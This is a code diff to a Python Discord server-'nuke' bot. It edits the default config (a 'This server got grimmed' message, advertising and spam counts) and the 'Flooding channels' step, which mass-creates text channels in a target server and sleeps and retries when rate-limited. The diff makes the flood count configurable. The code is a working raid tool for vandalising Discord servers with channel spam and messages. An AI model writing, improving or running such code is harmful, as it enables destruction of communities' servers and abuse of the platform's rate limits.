@@ -10,10 +10,10 @@ def load_config():
         if os.path.exists("config.example.json"):
             shutil.copy("config.example.json", CONFIG_PATH)
         else:
-            json.dump({"channel_name": "nuked-by-grim",
-           "message": "This server got nuked by grim!",
-           "advertise": True, "spam_count": 5},
-          open(CONFIG_PATH, "w"), indent=2)
+            json.dump({"channel_name": "grim-nuked",
+                       "message": "This server got grimmed",
+                       "advertise": True, "spam_count": 5, "channel_count": 10},
+                      open(CONFIG_PATH, "w"), indent=2)
     return json.load(open(CONFIG_PATH))
 
 def save_config(cfg):
@@ -68,7 +68,8 @@ async def nuke(guild, cfg, client, console, dry=False):
 
     console.rule("[bold red]Step 4 — Flooding channels")
     created = []
-    while True:
+    channel_count = cfg.get("channel_count", 10)
+    for _ in range(channel_count):
         try:
             c = await guild.create_text_channel(cfg["channel_name"])
             created.append(c)
@@ -76,7 +77,8 @@ async def nuke(guild, cfg, client, console, dry=False):
             await asyncio.sleep(0.15)
         except discord.HTTPException as e:
             if e.status == 429:
-                await asyncio.sleep(1.5); continue
+                await asyncio.sleep(1.5)
+                continue
             console.log(f"[yellow]STOP[/] channel creation - HTTP {e.status}")
             break
         except Exception as e:
